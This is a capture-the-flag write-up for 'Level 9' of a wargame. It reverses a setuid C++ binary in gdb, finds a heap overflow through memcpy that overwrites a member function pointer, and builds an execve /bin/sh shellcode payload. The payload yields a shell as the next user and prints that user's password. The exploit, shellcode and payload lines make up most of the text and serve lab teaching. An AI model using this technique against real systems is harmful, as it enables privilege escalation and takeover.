# Level 9

## Requirements

- None

## Walkthrough

1. Login
    
    ```bash
    > ssh -p 4242 level9@192.168.1.66
    Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    
    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
    System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
    ```
    
2. Check file
    
    ```bash
    > ls -l
    total 8
    -rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
    
    > ./level9 
    > ./level9 qwe
    > ./level9 qwe qwe
    ```
    
3. Well… Absolutly nothing happens… GDB to the rescue.
    
    ```bash
    > (gdb) info functions
    All defined functions:
    
    Non-debugging symbols:
    0x08048464  _init
    0x080484b0  __cxa_atexit
    0x080484b0  __cxa_atexit@plt
    0x080484c0  __gmon_start__
    0x080484c0  __gmon_start__@plt
    0x080484d0  std::ios_base::Init::Init()
    0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
    0x080484e0  __libc_start_main
    0x080484e0  __libc_start_main@plt
    0x080484f0  _exit
    0x080484f0  _exit@plt
    0x08048500  _ZNSt8ios_base4InitD1Ev
    0x08048500  _ZNSt8ios_base4InitD1Ev@plt
    0x08048510  memcpy
    0x08048510  memcpy@plt
    0x08048520  strlen
    0x08048520  strlen@plt
    0x08048530  operator new(unsigned int)
    0x08048530  _Znwj@plt
    0x08048540  _start
    0x08048570  __do_global_dtors_aux
    0x080485d0  frame_dummy
    0x080485f4  main
    0x0804869a  __static_initialization_and_destruction_0(int, int)
    0x080486da  _GLOBAL__sub_I_main
    0x080486f6  N::N(int)
    0x080486f6  N::N(int)
    0x0804870e  N::setAnnotation(char*)
    0x0804873a  N::operator+(N&)
    0x0804874e  N::operator-(N&)
    0x08048770  __libc_csu_init
    0x080487e0  __libc_csu_fini
    0x080487e2  __i686.get_pc_thunk.bx
    0x080487f0  __do_global_ctors_aux
    0x0804881c  _fini
    ```
    
4. Ok, so it seems that we have some C++ code now.
    
    ```bash
    > (gdb) disas main
    Dump of assembler code for function main:
       0x080485f4 <+0>:	push   %ebp
       0x080485f5 <+1>:	mov    %esp,%ebp
       0x080485f7 <+3>:	push   %ebx
       0x080485f8 <+4>:	and    $0xfffffff0,%esp
       0x080485fb <+7>:	sub    $0x20,%esp
       0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
       0x08048602 <+14>:	jg     0x8048610 <main+28>
       0x08048604 <+16>:	movl   $0x1,(%esp)
       0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
       0x08048610 <+28>:	movl   $0x6c,(%esp)
       0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
       0x0804861c <+40>:	mov    %eax,%ebx
       0x0804861e <+42>:	movl   $0x5,0x4(%esp)
       0x08048626 <+50>:	mov    %ebx,(%esp)
       0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
       0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
       0x08048632 <+62>:	movl   $0x6c,(%esp)
       0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
       0x0804863e <+74>:	mov    %eax,%ebx
       0x08048640 <+76>:	movl   $0x6,0x4(%esp)
       0x08048648 <+84>:	mov    %ebx,(%esp)
       0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
       0x08048650 <+92>:	mov    %ebx,0x18(%esp)
       0x08048654 <+96>:	mov    0x1c(%esp),%eax
       0x08048658 <+100>:	mov    %eax,0x14(%esp)
       0x0804865c <+104>:	mov    0x18(%esp),%eax
       0x08048660 <+108>:	mov    %eax,0x10(%esp)
       0x08048664 <+112>:	mov    0xc(%ebp),%eax
       0x08048667 <+115>:	add    $0x4,%eax
       0x0804866a <+118>:	mov    (%eax),%eax
       0x0804866c <+120>:	mov    %eax,0x4(%esp)
       0x08048670 <+124>:	mov    0x14(%esp),%eax
       0x08048674 <+128>:	mov    %eax,(%esp)
       0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
       0x0804867c <+136>:	mov    0x10(%esp),%eax
       0x08048680 <+140>:	mov    (%eax),%eax
       0x08048682 <+142>:	mov    (%eax),%edx
       0x08048684 <+144>:	mov    0x14(%esp),%eax
       0x08048688 <+148>:	mov    %eax,0x4(%esp)
       0x0804868c <+152>:	mov    0x10(%esp),%eax
       0x08048690 <+156>:	mov    %eax,(%esp)
       0x08048693 <+159>:	call   *%edx
       0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
       0x08048698 <+164>:	leave  
       0x08048699 <+165>:	ret    
    End of assembler dump.
    ```
    
5. Pseudo-code using IDA and some manual refactoring.
    
    ```cpp
    class N
    {
    public:
    	int ( N::*fn )( N & );
    	char annotation[100];
    	int n;
    	
    public:
    	N( int n ) : n(n), fn(&N::operator+) {}
    	
    	int operator+( N & other ) { return this->n + other.n; }
    	int operator-( N & other ) { return this->n - other.n; }
    	
    	int setAnnotation( char const * str ) 
    		{ return std::memcpy(this->annotation, str, std::strlen(str)); }
    };
    
    int main(int argc, const char **argv, const char **envp)
    {
      N *a; // ebx
      N *b; // ebx
      N *c; // [esp+1Ch] [ebp-8h]
    
      if ( argc <= 1 )
        exit(1);
        
      a = new N(5);  
      b = new N(6);
      c = a;
      c->setAnnotation(argv[1]);
      
      return (b->*(b->fn))(*c);
    }
    ```
    
6. Fine, refactoring was a bit tedious, but we have a better understanding of what’s going on now.
First thing to notice, is that we don’t have any `system` call, so are going to have to provide our own ShellCode, therefore, we have to find how much we need to overflow. Since there is only 1 exploitable function (`memcpy`), let’s find out.
    
    ```cpp
    > gdb level9
    ...
    
    > (gdb) r $(python -c "import string; print ''.join([ c*4 for c in string.ascii_letters ])")
    Starting program: /home/user/level9/level9 $(python -c "import string; print ''.join([ c*4 for c in string.ascii_letters ])")
    
    Program received signal SIGSEGV, Segmentation fault.
    0x08048682 in main ()
    
    > (gdb) i r
    eax            0x42424242	1111638594
    ecx            0x5a5a5a5a	1515870810
    edx            0x804a0dc	134521052
    ebx            0x804a078	134520952
    esp            0xbffff640	0xbffff640
    ebp            0xbffff668	0xbffff668
    esi            0x0	0
    edi            0x0	0
    eip            0x8048682	0x8048682 <main+142>
    eflags         0x210283	[ CF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    ```
    
7. Perfect, old tricks still works, however, it’s not really what we were expecting, we have filled `eax` and `ecx` instead of `eip`. Let’s trace back to see what is happening.
    
    ```bash
    > (gdb) b *0x0804867c
    Breakpoint 1 at 0x804867c
    (gdb) r $(python -c "import string; print ''.join([ c*4 for c in string.ascii_letters ])")
    Starting program: /home/user/level9/level9 $(python -c "import string; print ''.join([ c*4 for c in string.ascii_letters ])")
    
    Breakpoint 1, 0x0804867c in main ()
    
    > (gdb) x/64x $sp
    0xbffff640:	0x0804a008	0xbffff839	0xbffff710	0xb7d79e55
    0xbffff650:	0x0804a078	0x0804a008	0x0804a078	0x0804a008
    0xbffff660:	0x08048770	0xb7eebff4	0x00000000	0xb7d604d3
    0xbffff670:	0x00000002	0xbffff704	0xbffff710	0xb7fdc860
    0xbffff680:	0x00000000	0xbffff71c	0xbffff710	0x00000000
    0xbffff690:	0x08048288	0xb7eebff4	0x00000000	0x00000000
    0xbffff6a0:	0x00000000	0xbcd749fd	0xef328ded	0x00000000
    0xbffff6b0:	0x00000000	0x00000000	0x00000002	0x08048540
    > (gdb) x/64x 0x0804a000
    0x804a000:	0x00000000	0x00000071	0x08048848	0x61616161
    0x804a010:	0x62626262	0x63636363	0x64646464	0x65656565
    0x804a020:	0x66666666	0x67676767	0x68686868	0x69696969
    0x804a030:	0x6a6a6a6a	0x6b6b6b6b	0x6c6c6c6c	0x6d6d6d6d
    0x804a040:	0x6e6e6e6e	0x6f6f6f6f	0x70707070	0x71717171
    0x804a050:	0x72727272	0x73737373	0x74747474	0x75757575
    0x804a060:	0x76767676	0x77777777	0x78787878	0x79797979
    0x804a070:	0x7a7a7a7a	0x41414141	0x42424242	0x43434343
    0x804a080:	0x44444444	0x45454545	0x46464646	0x47474747
    0x804a090:	0x48484848	0x49494949	0x4a4a4a4a	0x4b4b4b4b
    0x804a0a0:	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f
    0x804a0b0:	0x50505050	0x51515151	0x52525252	0x53535353
    0x804a0c0:	0x54545454	0x55555555	0x56565656	0x57575757
    0x804a0d0:	0x58585858	0x59595959	0x5a5a5a5a	0x00000000
    0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
    0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
    > (gdb) i r
    eax            0x804a00c	134520844
    ecx            0x5a5a5a5a	1515870810
    edx            0x804a0dc	134521052
    ebx            0x804a078	134520952
    esp            0xbffff640	0xbffff640
    ebp            0xbffff668	0xbffff668
    esi            0x0	0
    edi            0x0	0
    eip            0x804867c	0x804867c <main+136>
    eflags         0x200283	[ CF SF IF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    
    # 0x0804867c <+136>:	mov    0x10(%esp),%eax
    > (gdb) ni
    0x08048680 in main ()
    
    > (gdb) x/32x $sp
    0xbffff640:	0x0804a008	0xbffff839	0xbffff710	0xb7d79e55
    0xbffff650:	0x0804a078	0x0804a008	0x0804a078	0x0804a008
    0xbffff660:	0x08048770	0xb7eebff4	0x00000000	0xb7d604d3
    0xbffff670:	0x00000002	0xbffff704	0xbffff710	0xb7fdc860
    0xbffff680:	0x00000000	0xbffff71c	0xbffff710	0x00000000
    0xbffff690:	0x08048288	0xb7eebff4	0x00000000	0x00000000
    0xbffff6a0:	0x00000000	0xbcd749fd	0xef328ded	0x00000000
    0xbffff6b0:	0x00000000	0x00000000	0x00000002	0x08048540
    > (gdb) x/64x 0x0804a000
    0x804a000:	0x00000000	0x00000071	0x08048848	0x61616161
    0x804a010:	0x62626262	0x63636363	0x64646464	0x65656565
    0x804a020:	0x66666666	0x67676767	0x68686868	0x69696969
    0x804a030:	0x6a6a6a6a	0x6b6b6b6b	0x6c6c6c6c	0x6d6d6d6d
    0x804a040:	0x6e6e6e6e	0x6f6f6f6f	0x70707070	0x71717171
    0x804a050:	0x72727272	0x73737373	0x74747474	0x75757575
    0x804a060:	0x76767676	0x77777777	0x78787878	0x79797979
    0x804a070:	0x7a7a7a7a	0x41414141	0x42424242	0x43434343
    0x804a080:	0x44444444	0x45454545	0x46464646	0x47474747
    0x804a090:	0x48484848	0x49494949	0x4a4a4a4a	0x4b4b4b4b
    0x804a0a0:	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f
    0x804a0b0:	0x50505050	0x51515151	0x52525252	0x53535353
    0x804a0c0:	0x54545454	0x55555555	0x56565656	0x57575757
    0x804a0d0:	0x58585858	0x59595959	0x5a5a5a5a	0x00000000
    0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
    0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
    > (gdb) i r
    eax            0x804a078	134520952
    ecx            0x5a5a5a5a	1515870810
    edx            0x804a0dc	134521052
    ebx            0x804a078	134520952
    esp            0xbffff640	0xbffff640
    ebp            0xbffff668	0xbffff668
    esi            0x0	0
    edi            0x0	0
    eip            0x8048680	0x8048680 <main+140>
    eflags         0x210283	[ CF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    
    # 0x08048680 <+140>:	mov    (%eax),%eax
    > (gdb) ni
    0x08048682 in main ()
    
    > (gdb) x/32x $sp
    0xbffff640:	0x0804a008	0xbffff839	0xbffff710	0xb7d79e55
    0xbffff650:	0x0804a078	0x0804a008	0x0804a078	0x0804a008
    0xbffff660:	0x08048770	0xb7eebff4	0x00000000	0xb7d604d3
    0xbffff670:	0x00000002	0xbffff704	0xbffff710	0xb7fdc860
    0xbffff680:	0x00000000	0xbffff71c	0xbffff710	0x00000000
    0xbffff690:	0x08048288	0xb7eebff4	0x00000000	0x00000000
    0xbffff6a0:	0x00000000	0xbcd749fd	0xef328ded	0x00000000
    0xbffff6b0:	0x00000000	0x00000000	0x00000002	0x08048540
    > (gdb) x/64x 0x0804a000
    0x804a000:	0x00000000	0x00000071	0x08048848	0x61616161
    0x804a010:	0x62626262	0x63636363	0x64646464	0x65656565
    0x804a020:	0x66666666	0x67676767	0x68686868	0x69696969
    0x804a030:	0x6a6a6a6a	0x6b6b6b6b	0x6c6c6c6c	0x6d6d6d6d
    0x804a040:	0x6e6e6e6e	0x6f6f6f6f	0x70707070	0x71717171
    0x804a050:	0x72727272	0x73737373	0x74747474	0x75757575
    0x804a060:	0x76767676	0x77777777	0x78787878	0x79797979
    0x804a070:	0x7a7a7a7a	0x41414141	0x42424242	0x43434343
    0x804a080:	0x44444444	0x45454545	0x46464646	0x47474747
    0x804a090:	0x48484848	0x49494949	0x4a4a4a4a	0x4b4b4b4b
    0x804a0a0:	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f
    0x804a0b0:	0x50505050	0x51515151	0x52525252	0x53535353
    0x804a0c0:	0x54545454	0x55555555	0x56565656	0x57575757
    0x804a0d0:	0x58585858	0x59595959	0x5a5a5a5a	0x00000000
    0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
    0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
    > (gdb) i r
    eax            0x42424242	1111638594
    ecx            0x5a5a5a5a	1515870810
    edx            0x804a0dc	134521052
    ebx            0x804a078	134520952
    esp            0xbffff640	0xbffff640
    ebp            0xbffff668	0xbffff668
    esi            0x0	0
    edi            0x0	0
    eip            0x8048682	0x8048682 <main+142>
    eflags         0x210283	[ CF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    
    # 0x08048682 <+142>:	mov    (%eax),%edx
    > (gdb) ni
    
    Program received signal SIGSEGV, Segmentation fault.
    0x08048682 in main ()
    ```
    
8. Ok, fine, it’s a lot of information, but we can summarize it by replacing `register` ’s names, by there values.
    
    ```nasm
    0x0804867c <+136>:	mov    0x10(%esp),%eax    // eax = 0xbffff650
    0x08048680 <+140>:	mov    (%eax),%eax        // eax = 0x42424242
    0x08048682 <+142>:	mov    (%eax),%edx        // edx = *(0x42424242) // SegFault
    ```
    
9. Ok, it’s more obvious now, there is a double dereferencement, and the second one being on our overflow `0x42424242`. Good, so we have to provide a dereferenciable address, but to do what ?
Let’s analyse what’s going next.
    
    ```nasm
    0x0804867c <+136>:	mov    0x10(%esp),%eax    // eax = 0xbffff650
    0x08048680 <+140>:	mov    (%eax),%eax        // eax = 0x42424242
    0x08048682 <+142>:	mov    (%eax),%edx        // edx = *(0x42424242) // SegFault
    0x08048684 <+144>:	mov    0x14(%esp),%eax    // eax = 0xbffff654
    0x08048688 <+148>:	mov    %eax,0x4(%esp)     // *(0xbffff644) = 0xbffff654
    0x0804868c <+152>:	mov    0x10(%esp),%eax    // eax = 0xbffff650
    0x08048690 <+156>:	mov    %eax,(%esp)        // *(0xbffff640) = 0xbffff650
    0x08048693 <+159>:	call   *%edx              // (*(*0x42424242))()
    0x08048695 <+161>:	mov    -0x4(%ebp),%ebx    // ...
    0x08048698 <+164>:	leave  
    0x08048699 <+165>:	ret    
    ```
    

10. There is an unusual `call *%edx`, with `%edx` being defined by the double dereferencement, so we might start to play with it. Using the pattern, we have set it to `*0x42424242`, so we have an offset of `108` bytes.

```nasm
> (gdb) x/48x 0x0804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x61616161
0x804a010:	0x62626262	0x63636363	0x64646464	0x65656565
0x804a020:	0x66666666	0x67676767	0x68686868	0x69696969
0x804a030:	0x6a6a6a6a	0x6b6b6b6b	0x6c6c6c6c	0x6d6d6d6d
0x804a040:	0x6e6e6e6e	0x6f6f6f6f	0x70707070	0x71717171
0x804a050:	0x72727272	0x73737373	0x74747474	0x75757575
0x804a060:	0x76767676	0x77777777	0x78787878	0x79797979
0x804a070:	0x7a7a7a7a	0x41414141	0x42424242	0x43434343
0x804a080:	0x44444444	0x45454545	0x46464646	0x47474747
0x804a090:	0x48484848	0x49494949	0x4a4a4a4a	0x4b4b4b4b
0x804a0a0:	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f
0x804a0b0:	0x50505050	0x51515151	0x52525252	0x53535353

> (gdb) p/d 0x0804a078 - 0x0804a00c
$2 = 108
```

1. Good! So, since we have to provide our own ShellCode, I think it’s time to get one.
    
    ```c
    // <https://shell-storm.org/shellcode/files/shellcode-811.html>
    unsigned char code[28] = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80";
    ```
    
2. Now, we have our padding size (`108`), our ShellCode (`28`) and the buffer start address (`0x0804a000c`), we should be able to design our payload.
    
    ```bash
    # ShellCode (28 bytes) Padding (108 - 28 = 80 bytes) Address to dereference ( 4 bytes )
    python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*80 + '\\x0c\\xa0\\x04\\x08'"
    ```
    
3. Let’s try it.
    
    ```bash
    > (gdb) b *0x0804867c
    Breakpoint 1 at 0x804867c
    
    > (gdb) r $(python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*80 + '\\x0c\\xa0\\x04\\x08'")
    Starting program: /home/user/level9/level9 $(python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*80 + '\\x0c\\xa0\\x04\\x08'")
    
    Breakpoint 1, 0x0804867c in main ()
    
    > (gdb) c
    Continuing.
    
    Program received signal SIGSEGV, Segmentation fault.
    0x6850c031 in ?? ()
    ```
    
4. Oh crap… Thought we had it. We have another SegFault at `0x6850c031` . 
Wait a minute! That’s the beginning of our payload! We forgot to provide another dereferenciable address for `call *%edx`.
    
    ```bash
    # Address 2 (4) ShellCode (28) Padding (108 - 4 - 28 = 76) Address 1 (4)
    
    python -c "print '\\x10\\xa0\\x04\\x08' + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*76 + '\\x0c\\xa0\\x04\\x08'"
    
    #
    # Alternative Solutions
    #
    # Since we have a double dereferencement, we could have set pointers to anywhere
    # in our allocated space ( 108 bytes ), and put our ShellCode accordingly.
    # For example, instead of pushing the 2nd address in front of our payload,
    # we could have set it to anywhere between 0x0804a00c and 0x0804a074,
    # as long as it does not break our ShellCode.
    # Only the Address1 position is fixed, but its value isn't.
    #
    # Padding ShellCode Address2 Address1
    # Address2 Padding ShellCode Address1
    # ...
    
    # Ex: ShellCode Padding Address2 Address1
    python -c "print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*76 + '\\x0c\\xa0\\x04\\x08' + '\\x74\\xa0\\x04\\x08'"
    ```
    
5. Let’s try again.
    
    ```bash
    > (gdb) r $(python -c "print '\\x10\\xa0\\x04\\x08' + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*76 + '\\x0c\\xa0\\x04\\x08'")
    Starting program: /home/user/level9/level9 $(python -c "print '\\x10\\xa0\\x04\\x08' + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*76 + '\\x0c\\xa0\\x04\\x08'")
    process 2703 is executing new program: /bin/dash
    $ whoami
    level9
    $ 
    ```
    
6. We did it! Get the flag!
    
    ```bash
    > ./level9 $(python -c "print '\\x10\\xa0\\x04\\x08' + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80' + 'A'*76 + '\\x0c\\xa0\\x04\\x08'")
    $ whoami
    bonus0
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
    $ 
    ```
    

## Documentation

- Documentation: [x86 - Asm](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)